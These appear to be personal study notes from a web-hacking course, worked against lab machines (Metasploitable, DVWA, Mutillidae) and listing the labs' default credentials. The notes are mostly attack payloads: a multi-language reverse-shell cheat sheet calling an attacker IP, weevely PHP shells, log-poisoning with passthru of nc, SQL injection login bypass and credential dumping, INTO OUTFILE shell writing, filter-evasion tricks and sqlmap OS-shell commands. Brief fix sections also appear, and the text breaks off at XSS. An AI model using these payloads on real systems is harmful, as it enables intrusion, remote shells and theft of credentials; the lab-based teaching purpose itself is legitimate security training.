When we r using the metasploit, kalilinux, windows from vm then the connection among them would be a kind of ethernet connection
as they all r connected with the same network NAT network

Kali Linux ->
Username -> root
Password -> toor

Metaspolit ->
Password and username -> msfadmin
to turn of machine -> sudo poweroff

Windows VM ->
Password -> Passw0rd!

DVWA ->
Username -> admin
Password -> password

Beef ->
username and password -> beef

- Already multiple websites r installed in the metasploit which we can exploit

- Make sure that the Kali and Metospolit r connected on the same NAT network and to check it go to ur attacker machine (kali linux) 
and then open the browser and enter the IP address in the URL of browser of victim machine(metasploit), if it is connected then the
metaspoit is going to open

Note - to fix one config issue in metasploit go to terminal and enter -> nano /var/www/mutilladae/config.inc

- Website is just an application that is install in a computer and it need other applications to work such as webserver and database 
etc, So basically every time u request a web page it is executed on the web server not on the client's computer, So as it execute's 
on the web server it sends back a HTML page which is ready to read for the target person or clients
So if we want any thing to be executed on the web server such as virus etc then we need to send it in the language which web server
understands such as python or php, So it gives u access to the server and not the access to the person who accessed that server
In the case of the websites which execute the Javascript, in this case even the code might be injected into the web server it will be
executed on the client side and it will allow u to do the things on the client computer not to the server

- In our case scenario metasploitable machine is itself the webserver and the websites r installed on it

Ways to hack the website ->
- hack the web application
- attack the computer on which the web server is present
- target the humans who manage the website

#1- Gathering Information(Foot printing) ->
    Some of the things we should know about the targets r as following ->
    - IP address
    - Domain Name Info
    - Technologies Used
    - Other websites on the same server
    - DNS records
    - Unlisted files, sub domains, directories

Whois Lookup -> It is a protocol which is used to find owners of the internet resources(such as servers, IP and domain)
Ex go to -> whois.domaintools.com

    if u do ping isecur1ty.org // u can get the IP of the application

    How to know about the technologies used by the target website?
    go to toolbar.netcraft.com/site_report

How to get comprehensive DNS information on target website?
go to robtex.com we can look into the 'a' records(which r used for combining the website name with IP), 'ns' the name server records,
'mx' the mail server records

   Discovering Websites on the same server ->
   We can hack into the other website which is installed on the same server and then attack the target website

Websites hosted by the same webserver would have the same IP's such as phs63.org and zaid.com website ->
https://www.yougetsignal.com/tools/web-sites-on-web-server/ or we can also go on bing.com and enter IP their as ip:ip_address_here
and all the websites shown their r the websites which r on the same web server

Sub Domains -> Such as beta.facebook.com, the sub domains for certain users or customers, the search engines never have sub domains
and u will also not see the link leading to them, so we can use the sub domains also to exploit the websites
To know about the sub domains we use the tool called 'knock' // it use the brute force attack
cmd -> git clone https://github.com/guelfoweb/knock.git
cmd -> cd knock/knockpy
cmd -> python knockpy.py website_name

Find the Files and directories stored on the target computer or website ->
To check if we go to our metasplot machine and do cmd -> cd /var/www then cmd -> ls -la
we can see the directory for the web application mutillidae
So to open it from our attacker machine we can use-> ip_of_web_server/mutillidae

   we can use dirb as cmd -> man dirb  // this cmd also uses brute force
   cmd -> dirb http://ip_address/path  // it use a wordlist file So we can use the cmd as like this also
   dirb http://ip_address/path wordlist_file_path

By using the above cmds we would get the list of all the files and directories such as phpinfo.php, config.inc and robots.txt // we 
can use the robots.txt to find about the files which website wants to hide and we can use phpinfo.php to find the data about the php
machine and details.

   Detection of Web Application Firewall with WAFW00F ->
       - in the most cases their is web application firewall available, So here firewall stops the malicious requests
       - in the attacker machine terminal -> wafw00f
       -> wafw00f https://66.29.212.110 // and it will simply tell u whether their is firewall or not

Maltego - It is a program which allow us to gather information about many things such as gather information about people using their
name, phones, emails, u can gather information about websites

#2- File Upload Vulnerabilities ->

  Weevly -> It generates php shells and allow us to gain access on the target computer
   in terminal -> weevely generate 123456 /root/shell.php
   // 2nd input tells what we wanna do here we want to generate the shell file hence we use generate
   // 3rd input is for the password which only us wants to see
   // 4th is for the path where u want to put the file after generated

If u r not able to upload the file then set the DVWA security as low or name the file as shell.php.jpg
We can use burp suite also as we can change the files name back to php in headers and then forward the packet // this helps to bypass
the file type filter
If it is also checking the extension then change the file name as shell.php.jpg and we can use it in same way like weevly as ->
weevely url_for_place_where_shell.php.jpg ur_password_for_file   // it will run in same way

   To interact with the uploaded file cmds
   weevely url_for_place_where_shell_file_is ur_password_for_file // after this u will be able to execute linux cmds
   cmd -> help // to know about the things u can do
   cmds -> pwd or ls
   cmd -> uname -a // to know the machine

Fixing the File Upload Vulnebility issue ->
Things to keep in mind ->
- Never allow people to upload executables such as bash script or php file etc
- Check the file type and the file extension
- analyse the uploaded file urself, and recreate it and rename it and delete the old image  // their r libraries for this task we
should always use them

Suppose u go to a page and u could see the URL as www.abc.com/dvwa/?page=include.php // here we can see ?page=include.php which means
it is a GET request
And the better way to deal with the POST requests we can use - BURP Proxy
In BURP what we r going to do that instead of sending the request directly to web server from the website we will send it first to
proxy after starting burp go to options tab to check where is the proxy currently running, to use BURP we need to tell our browser to
send all requests to burp proxy
To set it up go to the browser preferences then to Network Settings
In Burp go to the intercept tab, and now what ever the link is accessed on browser we can see them here
We can modify the packets also and Forward the data when we want until then the page would not be accessed on the browser
Burp Suite here works like a client side proxy

   ByPass Medium File Upload Security ->
   - change the name of the file extension from php to jpg
   - Intercept the packet and change the packet back from the jpg to php

#3- Code Execution Vulnebilities -> This allows an attacker to execute OS commands we can upload any file using the wget command
another way of exploiting this vulnebility is to just run OS cmds and get a reverse shell based on those commands

- Always go through the website to get an idea about it and check for the input boxes that how can u exploit them

Such as suppose we r allowing to do ping and execute an cmd ping and input box is asking to enter the IP so we can use ';' semicolon
as in the linux and unix based systems we can enter multiple cmds by using ';' Now if the extra cmds r being executed then it is code
execution vulnebilites

In the terminal cmd -> nc -vv -l -p 8080 // this uses netcat, Netcat is a tool that allows u to connect and listen computers together

So from the input box of the vulnerable website enter the cmd -> nc -e /bin/sh attacker_ip 8080 // we r assuming it is using netcat
now on the attacker machine we can fire linux cmds after the connection is established

For other web server technologies the code executables r as follows ->
The following examples assumes the hacker IP is 10.20.14.203 and use port 8080 for the connection.
Therefore in all f these cases you need to listen for port 8080 using the following command
nc -vv -l -p 8080


BASH
bash -i >& /dev/tcp/10.20.14.203/8080 0>&1

PERL
perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP
php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby
ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Netcat
nc -e /bin/sh 10.20.14 8080

If their is no code executable vulrnebality or using filter then we can use pipe such as ->  ping input_ip | pwd// 2nd cmd after pipe
sign will give us shell on the server in this case it won't because we r using pwd so it will just give the path

we can use pipe as cmd -> ping input_ip | nc -e /bin/sh 10.20.14 8080 // now it will connect

How to Fix Code execution vulnebilities ->
Things to remember ->
- Don't allow users to execute any code on the server // if u have to use it then make sure u analyse the input such as use regex etc

Note -> If u r still connected to the machine using above method u will notice that u r not able to navigate through browser on that
        app

- Local File Inclusion -> these allows u to read any file within the same server also the files outside the www directory

we can exploit this vulnebility through URL
Steps -> Go to the web page and see the URL in my example u will see include.php is loaded
-> to check for the file is available go to new tab and enter as 10..../dvwa/vulnerabilities/fi/include.php and u will get the path
where the file is present
-> Now in the linux machine u can use cmd -> cat /etc/passwd // this file contains all the users and passwords, then the path u get
to know from above step see how many times u needed to go back
-> So paste the path in the place of the URL where their is query for the page and u will see the data like this
10..../dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd

    We can use other things in place of /etc/passwd such as->
    - /proc/self/environ
    - /var/log/auth.log
    - /var/log/apache2/access.log

    USER AGENT refers to the browser

- In the browser (let the intercept on for the burp suite) enter the url ->
10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../proc/self/environ
- then go to the burp suite and in the headers and see the User Agent and edit it as <?phpinfo();?> , then forward the packet
- then on the browser u will see that PHP related information is displayed which means u can send code // this also means u can send
any php coded such as code to list files, code to upload a file

- in the terminal ->  nc -vv -l -p 8080
- again intercept the url 10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../proc/self/environ through burp suite and edit the 
User agent
- put this in user agent <?passthru("nc -e /bin/sh 10.20.14 8080");?> // we use passthru to run the unix cmds on the server
- and u will see that the connection is established and fire the linux cmds

    other way is as follows ->

- In the browser (let the intercept on for the burp suite) enter the url ->
10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/auth.log
- Now ssh into the server cmd -> ssh random_username@10.0.2.4 // then enter any string for the password
- and now if we go in the above URL 10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/auth.log // u will see the log of
ur invalid user and also show the IP address
- now instead of using the random_username we will put the php code
cmds -> nc -vv -l -p 8080 // in the terminal 1
cmds -> ssh "<?passthru('nc -e /bin/sh attacker_ip 8000');?>"@victim_ip // in the terminal 2, u only got one shot so make sure ur cmd
is correct , here in place of username I am putting PHP code it could be any code
// In the burp suite go to the decoder tab enter this nc -e /bin/sh 10.0.2.15 8000 then encode it as base64, copy the base64 string 
and then replace the cmd string with the base64 string, this makes sure that their is no kind of special character that would interfer
with cmd also use base64_decode method as like -> ssh "<?passthru(base64_decode("base64_converted_code"));?>"@10.0.2.15
- then enter any password and press enter in the URL 10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/auth.log

// why r we using above steps like this bcz as we see earlier that the username get to go inside the logs that's why we r using code
in place of username

- Remote File Inclusion -> It is a special case of Local File Inclusion vulnebilities, In this if the server allows u for certain
functions(Allow URL) then we will be able to include any file from any computer into target computer, So it is like Local File 
Inclusion allows u to access local Files and Remote allows u to access and inject remote files
Steps ->
- Go to metasploit machine terminal cmds -> cd /root
- cmd ->sudo nano /etc/php5/cgi/php.ini // this is for the php settings
- use ctrl+w to search allow_url and then check if the allow_url_fopen is On or not and also check the same for the allow_url_include, 
if these two r on then we can use the local file inclusion vulnebility as remote file inclusion
- If u have done the changes then after exit form nano u need to fire cmd ->sudo /etc/init.d/apache2 restart // to restart server
- Now we r going to access a file on the different server, if this pentest is happening on the actual web server theat the file needs
to be stored in a place with real IP address or domain name, here we r doing it on the local server
- In the attacker machine write a file using leafpad or any editor as following code in it
 <?php
 passthru("nc -e /bin/sh 10.20.14 8080");
 ?>
// Save the file with name as "reverse.txt" // we r saving it as the txt not php bcz it is going to be executed on kali machine and
we want the access for the metasploit machine not kali machine So save it in the Files Manager -> open other locations -> on this
computer -> var -> www -> html and save the file


- SQL Injections ->
To access the database on the Metasploitable machine cmd -> mysql -u root -h ip_of_metasploit // this not hacking it is simple
access as the metasploit does not use any password for the 'root' we can access it easily
cmds of SQL -> show databases;
use database_name
show tables;
select * from table_name;

Sql Injections r very hard to protect against and they give u access to database and most of the times u really don't need to get
reverse connections etc, Sql injections works in the same way as if u don't have the access to the database u wants to attack but 
can do sql injection on the other database in which is on the same server then u can exploit other database to So basically Sql
Injections can be used as File inclusion vurnebilities and File upload vulnebilities

To Discovery Sql Injections u need to browse through ur target and try to break each page, So when ever u see a text box or a 
parameter for example -> http://target.com/page.php?something=something, then try to inject stuff here try to use a ''' single quote
try to use an 'and' or the 'orderby'

Steps go to Mutillade in metasploit and go to it's login page register ur self and then login then see and logout
- On the login page try to inject in the Name and Password textbox as ur username and ''' single quote in password and u will see
an error is displayed which looks like a database error, and usally the error is not that much informative like this it would be
just in a way it is expected and sometimes it is a page which doesnot look like as it should, So u need to keep an eye on what's
changing
Now in the Error section which occured look into the Diagnotic Information and u will see the sql statement which is tried to be
executed

Now lets check if we can inject the code again, So enter the username and then in password enter as ur password with ''' single quote like
(123456') // we added a single quote bcz if we look in the statement ->
SELECT * FROM accounts WHERE username='Sadanand' AND password=''' ,So
here u will see that the ''' single quote is added by the system or query it self, So we will try to execute it as
SELECT * FROM accounts WHERE username='Sadanand' AND password='123456' and 1=1 ' // now here we can get the issue as the code is not
closed as we have added an extra quote so we will add the comment as basically anything after the comment is not executed So we use
SELECT * FROM accounts WHERE username='Sadanand' AND password='123456' and 1=1#'
So no we r going to enter in password field is ->123456' and 1=1# or 123456' and 1=1#' now this is not hacking but it shows the
vulnerability for the sql injection lets try other string in password field as -> 123456' and 1=2#' //but now u will see it has
given u authentication error even on giving right password and username
So it basically means that I can put any code here as like -> 123456' ANY_CODE_HERE #

By Passing Login with SQL Injection -> Now lets take the username as 'admin' and in the password as -> random_string or 1=1 #
in the above case the statement which is going to be get executed is
SELECT * FROM accounts WHERE username='admin' AND password='aaa' or 1=1#' // here 'or' is going to neglect the 'and'
and now u will see that I am able to login without the password
By passing of logins can be done in the many ways it depends on the code written on the page and on ur imagination that how the code
is written as in the above section we actually comes to know the code

Another way of bypassing instead of injecting the code in password like above we try to inject the code in Username as
-> admin' # // So my statement looks like this SELECT * FROM accounts WHERE username='admin' #' AND password='$PASSWORD'
Now u will see u manage to login

ByPassing More Secure Logins -> on the mutilliadae toggle the security to Arrogant level 1 and now u will see that the above sql
injection attacks won't work, now this filtering could be happening at the client side or the server side
If it is happening at the client side then the filtering would be happening before it is being sent to server
So for the client side we can bypass it using burp proxy and it also helps us identify whether it is happening client side or server
side.

Steps -> Start burp and put username as admin and password as aaa' or 1=1#, Now if in the burp the packet is not send then it is
client side filtering
- So now lets put username = admin and password = random_string // as this is a valid request so it won't be stopped by client side
 filters
- Now in the burp in Params tab u can modify the password values here as aaa' or 1=1#
- Now u r able to bypass the filter and able to login

How to prevent SQL Injections in login Pages ->
- In the mutilliadae increase the security level as 5 and try the above attack by using burp and u will see that it didn't work
- So in php we can use things like 'real_escape_string' for filtering the inputs
- look this video-> https://www.udemy.com/learn-website-hacking-penetration-testing-from-scratch/learn/v4/t/lecture/6019328?start=0

SQL Injections in GET ->
Steps ->
- Go to the left menu then to OWASP TOP 10 -> A1 Injection -> SQLi-Extract Data -> User Info // this is user info page
- enter in username as Sadanand and in password 123456 // it will just show u simply data
- Look into URL u will see the Params entered by u
- so copy the URL and modify it using orderby // orderby statement is used to order the results that we get on the basis of column
- So alter the URL-> index.php?page=user-info.php&username=Sadanand&password=123456&user-info-php-submit-button=View+Account+Details
to the following URL like
index.php?page=user-info.php&username=Sadanand' order by 1#&password=123456&user-info-php-submit-button=View+Account+Details
// here we r saying I wants to order the results based in the first column
// if it injection is possible then the above should work bcz in each select statement their should be one column

We could have also use it as -> Sadanand' order by 1# and enter random password and it will still show the data and on using the
above modified URL we will also get the data we just need to replace # with %23 when firing from browser like this
index.php?page=user-info.php&username=Sadanand' order by 1%23&password=123456&user-info-php-submit-button=View+Account+Details

now if we replace the above section like Sadanand' order by 100000# // now chances r their is no column with 10000 so this should
return the DB error

Reading Database Information ->
Now lets check the number of columns could be their in DB so we use above method as Sadanand' order by 10# which returns error but
by -> Sadanand' order by 5# it shows no error and this way we find the no. of columns which is at current 5

By the error we come to know that the statement is
Select * from accounts where username='Sadanand' order by 5" and password='dadadaadas'

So now we modify the statement as
'union select 1,2,3,4,5' and replace it by 'order by' as
index.php?page=user-info.php&username=Sadanand' union select 1,2,3,4,5%23&password=123456&user-info-php-submit-button=View+......
// now u will see it is showing counts as
Username=2
Passwords=3
Signature=4 // which means that what ever value u put in 2,3,4 of union, it is going to be displayed in this page in this particular
location

So lets modify the above URL again by putting database() in place of 2, user() in place of 3 and version() in place of 4 in union
like this ->
index.php?page=user-info.php&username=Sadanand' union select 1,database(),user(),version(),5%23&password=123456&user-info-php-sub...
Now we will see the output on page like this
Username=owasp10      // this was no. 2 so this is database
Passwords=root@localhost  // this is no. 3 so this is current user login as
Signature=5.0.51a-3ubuntu5 // this is no. 4 so this is version

we r using 2, 3, 4 places only bcz the returned data for the no. 1 and 5 would not be displayed over the website

Usualy in real life scenerios each database is assigned to a certain user So usally u only get data in that current database

Finding Database Tables ->
As now we know that our target database is owasp10 so lets modify the sql statement again like this
union select 1,table_name,null,null,5 from information_schema.tables // here we r selecting table from tables from DB
information_schema and column we r selecting is table_name
// information_schema is a default database created by mysql and it contains information about all other databases
// so the url would be now like this ->
index.php?page=user-info.php&username=Sadanand' union select 1,table_name,null,null,5 from information_schema.tables%23&password=1..
Now u will see that the tables records we have and we can even see the tables from other web applications also // but is real life
scenerios u will only see the tables from current database

Now we change the statement again like this ->
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10' and change the URL according to
it like this ->
index.php?page=user-info.php&username=Sadanand' union select 1,table_name,null,null,5 from information_schema.tables where 
table_schema = 'owasp10'%23&password=123456&user-info-php-submit-button=View+Account+Details

// and now we will get tables related to owasp10

Extracting Sensitive data such as Passwords ->
Now we need to now the columns in accounts in owasp10 so we change the statement as like this ->
union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'accounts' and change URL like ->
index.php?page=user-info.php&username=Sadanand' union select 1,column_name,null,null,5 from information_schema.columns where 
table_name = 'accounts'%23&password=123456&user-info-php-submit-button=View+Account+Details
// Now we get to know the columns in the accounts table

Now we change the statement like this
union select 1,username,password,is_admin,5 from accounts // now we change the URL like this
index.php?page=user-info.php&username=Sadanand' union select 1,username,password,is_admin,5 from accounts%23&password=
123456&user-info-php-submit-button=View+Account+Details
// now we will see the all usernames, passwords and their admin types

How to Discover and Exploit blind SQL injections-> In the Blind SQL injections it will not show errors to us but this does not means
that website is not vurnelable, In real life we most of the times encounter blind SQL Injections

We check the vulnerability by inputing the true or false statement and see how the page behaves, So it is true statement it will 
give a valid page if it is a false statement it will give invalid page(the page that doesn't look like what u expect)

So go to SQL blind section in dvwa website and put 1 in the input box and u will see result according to 1 id // this is valid page
Now lets try the true statement like this -> 1' and 1=1# and inject it in URL like this
10.0.2.4/dvwa/vulnerabilities/sqli_blind/?id=1' and 1=1%23&Submit=Submit#
Now u will see it has not affect the execution of statement

Now lets try we false statement like this -> 1' and 1=0# and inject it in URL like this
10.0.2.4/dvwa/vulnerabilities/sqli_blind/?id=1' and 1=0%23&Submit=Submit#
// now u will see it does not return default valid page without any error also // but we get to know that this is invalid page

we can also verify above by using order by
Now lets try we true statement like this -> 1' order by 1# and inject it in URL like this
10.0.2.4/dvwa/vulnerabilities/sqli_blind/?id=1' order by 1%23&Submit=Submit#
Now u will see it has not affect the execution of statement

Now lets try we false statement like this -> 1' order by 10000000# and inject it in URL like this
10.0.2.4/dvwa/vulnerabilities/sqli_blind/?id=1' order by 10000000%23&Submit=Submit#
// now u will see it does not return default valid page without any error also // but we get to know that this is invalid page

this concludes that the website is vulnerable even though it is not showing any errors about sql
So we exploit it by using statement -> 1' union select 1,2 and inject it in URL like this
10.0.2.4/dvwa/vulnerabilities/sqli_blind/?id=1' union select 1,2%23&Submit=Submit#
Now u see we see two records returned

we exploit it by selcting table name using statement -> 1' union select table_name,2 from information_schema.tables and inject it in
URL like this ->
10.0.2.4/dvwa/vulnerabilities/sqli_blind/?id=1' union select table_name,2 from information_schema.tables%23&Submit=Submit#
Now u see we see records returned according to query

So never just reply on single quote usage try to use 1=1 or order by to discover vurnebilities

Discovering more complicated sql injection ->
Go to DVWA app and then to security level as low then go to sql injection
- put 1 in input box and u will get the result according to that
- now try with true statement in input box as -> 1' and 1=1 # // this result is a valid page
- now try with false statement in input box as -> 1' and 1=0 # // this result is a invalid page
we can also use order by as statement 1' order by 1# and can also use statment as 1' order by 1000# // now this way we can check how
many columns r their here this way here we have 2 so on 1' order by 2# it will give the valid page

So this means the sql injection is possible in this page now we use the statement as -> 1' union select 1,2# and it will give the 
output accordingly
now statement as -> 1' union select database(),2# // and we will get the database names in the output which is dvwa
now statement as -> 1' union select table_name,2 from information_schema.tables where table_schema='dvwa'# // and tables name which
is guestbook and users
now statement as  -> 1' union select user,password from users # // now we can get the username and passwords present in the table

Above statements to be run on medium security level -> in dvwa switch security to medium and then go to SQL injection
now statement as -> 1' // now it will again give error but this time it will complain about the presence of single quote even the
same error will occur if we use the statement as 1' and 1=1 # and give the invalid page
So now we will use the http code instead of the ''' single quote
so we use the statement as -> 1%27 and 1=1# // here %27 is for ''' single quote and now we will get the output
even if we use the statement with out quote it will work as -> 1 and 1=1 #
// SQL injections varies from website to website so their is lots of trial and error
now statement -> 1%27 1=2# // this will give the invalid page
now statement -> 1%27 union select 1,2#
now statement -> 1%27 union select 1,2#
now statement -> 1%27 union select table_name,2 from information_schema.tables # // now we will get all the tables
now statement -> 1%27 union select table_name,2 from information_schema.tables where table_schema='dvwa'# // now we will get all the
error here we r getting error bcz with dvwa table schema we r using single quotes and website is using sometypes of filters for 
single quote

So now we need to think of a way to write the database name without quotes and put it after the equal, So we will use the burp suite
and we will use the decoder part of it to covert the text and we encode it as URL, So this way we can get the URL encode text for 
any string

// Every thing in hex starts with 0x and after this whatever comes has to be hex

So in burp in decoder we write dvwa and we encode it as 'hex' and we will get the set of numbers and we use the numbers in the
statement as->
1%27 union select table_name,2 from information_schema.tables where table_schema=0x64767761# // now we get the tables realted to 
dvwa DB

So using the above methods we basically play around and try to find out the exploit

Tips and tricks while exploiting SQL injection
- Some websites try to implement the security by checking the query for the number of words and they blacklist these words so that
if they exist they don't execute the query ex-> such as words like and, or, union, select, spaces etc
- So we can bypass client site security using burp suite

- suppose u r using statement to check for the exploit as and 1=1 we can use the statement as->
aNd 222=222 or we can use anD 111=111 this way the query will pass even if 'and' is blacklisted
- same we can do for the order by like this -> orDer bY 1
- sometimes websites don't allow spaces in URL so we can bypass them with -> + or /**/ instead of space
Ex -> union select 1,2 %23 // now we can convert this statement like this -> uNioN+sEleCt+1,2+%23 or
like this ->1%27 uNioN/**/sEleCt/**/1,2/**/%23 // and it will work

Sometimes comments r blacklisted or they do not work so we can use /* or -- or // as comments

Sometimes u also had to end the statement so u also had to add semicolon at the end of the statement and then add ur comment

Bypassing Security and Accessing all records ->
now at security low statement as -> 1%27 uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables%23 // and it will show the
exploit and show all the tables present in DB

Now what if the page is programmed to show the one result at a time // to do this do the following steps
- in metasploit machine cmd -> sudo nano /var/www/dvwa/vulnerabilities/sqli/source/low.php then enter the password and then modify
the while loop in the editor, as we wants to display only one result so we comment the while loop with '//' before while and the also
comment the while loop ending bracket
- now again run the above statement which is -> 1%27 uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables%23 // now u will
see only one record output is returned which is admin record
- So now we use it with invalid ID as -1 like this in url ->
10.0.2.4/dvwa/vulnerabilities/sqli_blind/?id=-1'+uNioN/**/sElecT/**/table_name,2+fRom++information_schema.tables%23&Submit=Submit# 
// and u will get the result as CHARACTER_SETS only one record is retuned so we need to iterate over the tables by using the 'limit'
keyword to iterate over the records one by one and display all of them So the statement will be like this ->
10.0.2.4/dvwa/vulnerabilities/sqli_blind/?id=-1'+uNioN/**/sElecT/**/table_name,2+fRom++information_schema.tables+limit+0,1 %23&Su...
// limit keyword takes two values one from which it is stated here it is 0 and second is for the no. of records we wants to display
and here it is returning only one record so we will put it as 1
// now u will get the first table now and to get the second table I will modify the first value of limit from 0 to 1 and it will 
give second table and so on.
// we can also enchance the above statement by using the where clause as before limit like this in URL ->
10.0.2.4/dvwa/vulnerabilities/sqli_blind/?id=-1'+uNioN/**/sElecT/**/table_name,2+fRom++information_schema.tables+where+table_schema=
'dvwa'+limit+0,1 %23&Submit=Submit#
// now U will see the users and u can iterate it over by changing the value of limit keyword first parameter

How to fix to SQL injections?
Go to DVWA website and set the security level to High and then go to SQL injection
lets try to inject it as -> 1 and 1=1 and also try -> 1' and 1=1 and u will see they didn't worked
Now if u view the source code and also open the source code for the medium security level u will see that in medium they have used
functions like mysql_ real_escape_string to search for any special character and u will also see the difference between the sql
statements of medium and high that in medium they r not using quotes for $id but in the high they r using quotes so what's happening
that in high they r using inputing the extra statement as if but in medium it would be considered as the sql statement

Reading and Writing Files on the Server using the SQL injection Vulnerabilities ->
we can use sql injections to read any files on the server even if the file exists outside the www root and we can also use the sql
injections to write files just like the File Upload Vulnerability
- Reading ->
- Go to mutillade website
- enter one ur original data to get the URL of the admin as username - admin and password -> adminpass
Now the statement would be like this ->' union select null,load_file('/etc/passwd'),null,null,null // we r using 5 bcz we have get
to know that we have 5 records

when we use the order by
- so the URL would be like this ->
index.php?page=user-info.php&username=admin' union select null,load_file('/etc/passwd'),null,null,null%23&password=
adminpass&user-info-php-submit-button=View+Account+Details
// now u will see all the information in the username section and u can see that msfadmin has login into the machine
// So we can see any file by inputing the full path of that file like in above example

- Writing ->
- we can write code for anything such as virus, phpshell etc, Now the statement would be like this ->
' union select null,'example example',null,null,null into outfile '/var/www/mutillidae/example.txt'
- so the URL would be like this ->
index.php?page=user-info.php&username=admin' union select null,'example example',null,null,null into
outfile '/var/www/mutillidae/example.txt'%23&password=adminpass&user-info-php-submit-button=View+Account+Details
// u will see it has given an error that it cannot create or write to the directory which means we don't have the permissions to 
allow it for this location so we now try another location -> /tmp/example.txt
So now the URL is like ->
index.php?page=user-info.php&username=admin' union select null,'example example',null,null,null into 
outfile '/tmp/example.txt'%23&password=adminpass&user-info-php-submit-button=View+Account+Details
// if u don't see the error of sql statement then it means we r able to write the file
// lets check it on the metasploit machine ->
- cd /var/www/phpMyAdmin
- ls /tmp // u will see the example.txt file written present their
- cat /tmp/example.txt // on reading the file u will see the content we write in the sql statement above
// so this way we can use the shell file too to exploit the system
// now in the best case scenerio u will be able to write into webroot which means u will be able to access the file through the
browser and execute it so u can upload a weevely file and then connect to it

- Getting a reverse shell and gaining control using SQL Injection ->
- the problem is we weren't able to write stuff to the web directories so we can't actually read the stuff using the URL so for that
part we need to work on the same web server, So if one of website on the same web server has the sql injection and the other website
has the local file inclusion we can combine use of them and get a shell

- Go to dvwa and set security to low
- statement ->1' union select 1,2 %23 put it inside the text box
- now I am gonna write my shell to tmp and then I am going to browse that shell using local file inclusion
- statement ->-1' union select '<?passthru("nc -e /bin/sh 10.0.2.15 8000");?>',null into outfile '/tmp/reverse.php' // by this it
 will try to connect to the given IP through netcat
// we r using -1 so that no values come in the First name and other parameters
// u will get the screen which says that the file already exists but actually it is written now to the server
- on the attacker machine listen to the connection, on the terminal -> nc -vv -l -p 8080
- now lets browse the file to execute it
10.0.2.4/dvwa/vulnerabilities/fi/page=../../../../../tmp/reverse.php // now on the attacker terminal u can see the connection is
established

Lets exploit it from the other website go to the muttilade website and then to OWASP TOP 10 -> Security Misconfiguration -> 
Directory Browsing
- now in the URL 10..../dvwa/mutilldae/index.php?page=../../../../../etc/passwd // to check vulnerability
- now in the URL 10..../dvwa/mutilldae/index.php?page=../../../../../tmp/reverse.php // to get the reverse shell connection

- The main problem here is that if we could have write it in the place such as '/var/www/dvwa/reverse.php' then we could have easily
browse to this file just like going to 10.0.2.4/dvwa/reverse.php but we don't have permission to write it here

- So it is better to found a writable place to the server

SQLmap -> this tool can help us to all the sql attacks we have done so far and even more, it is used against mysql databases, even
against, microsoft sql , oracle and other database types
Steps -> get the URL which we r using for the injection which is->
http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=admin&password=put_any_password&user-info-php-submit-but........
// here we r using any password as we currently don't know the password

in the attacker machine terminal->
sqlmap --help // to get the manual
sqlmap -u "paste_above_url" // - u is to specify the URL
Now the tool is going to look through all the parameters so ot is going to look through user info, username, password to see anyone
of them is injectible and once it has done that it is going to store it in memory
press 'Y' if the DB type is right such as SQL
press 'Y' to do the tests for both the databases
In the processing logs u can see it is saying that the username is injectible
Press 'N' if don't want to know the other injectable parameters at current
So now the sqlmap knows that the Username is injectable and it is going to use username parameter to inject stuff
and we can also see that it tell us about the DM machine and the OS machine
sqlmap --help
sqlmap -u "paste_above_url" --dbs // to get the current databases
we get all the databases we have
sqlmap -u "paste_above_url" --current-user // we can see we are root user
sqlmap -u "paste_above_url" --current-db // we can see our current database is owasp10
sqlmap -u "paste_above_url" --tables -D owasp10// to get all tables and -D is for the database from which we want them and all the
tables are shown to us in owasp10
sqlmap -u "paste_above_url" --columns -T accounts -D owasp10 // to get columns and -T is for tables and -D is for DB and we get 
all columns
sqlmap -u "paste_above_url" -T accounts -D owasp10 --dump // --dump to get the data and we get all the data

- Get Direct SQL Shell using sqlmap
SQL map also allows u to get different types of shells on the target server so we can try to get an OS shell
sqlmap -u "paste_above_url" --os-shell // in this case we cann't actually uplaod the files to the server so it is asking which
language the server is using
So we enter 4 as input bcz it is using php// but here u can see it has given the 404 error as the website doesn't allow to upload
the stuff

U can also ask for an "sql shell"
sqlmap -u "paste_above_url" --sql-shell // this will allow u to run sql statements straight away as if u r using it on sql server
before we were able to do that with union but here we r able to write more powerfull statements so we can perform much powerfull
attacks
- enter -> current_user()
- enter -> user()
- enter -> database()
- enter -> select table_name from information_schema.tables where table_schema = 'owasp10'
So here we can run any sql statement we want

- Prevent from SQL Injections
- People try to use the filters to show that their r no exploits but when u try harder using different types encoding or using a
proxy then u will be able to bypass most of these filters
- some programmers use blacklist so that they can for example prevent the use of union, insert and stuff like that but it is not 
that effective
- even on using the whitelist we have same issue like the blacklist

The way to do prevention is to program ur application in a way that it does not allow code to be get into it and execute it, so try
to use the parameterized statements so that the data and the code is seperated

Ex-> So suppose we have a vulnerable code such as like this

<?

$textbox1 = admin' union select #         // this is the sql injection statement which is going to be injected

Select * from accounts where username='$textbox1'       // and here it will get injected so it is not the correct way

Safe:       // best way to do
->prepare("Select * from accounts where username = ?")  // use the prepare statement
->execute(array('$textbox1'))// after the prepare statement is executed then take the value of $textbox1 now even we use the sql
                             // injection with the above statement we it won't do the attack as now it knows it's code not a value
?>

- also try to use the least privilage mechanism like AWS as much as possible

- XSS (Cross Site Scripting) -> this attack allows an attacker to inject javascript code into the page, this attack affects the
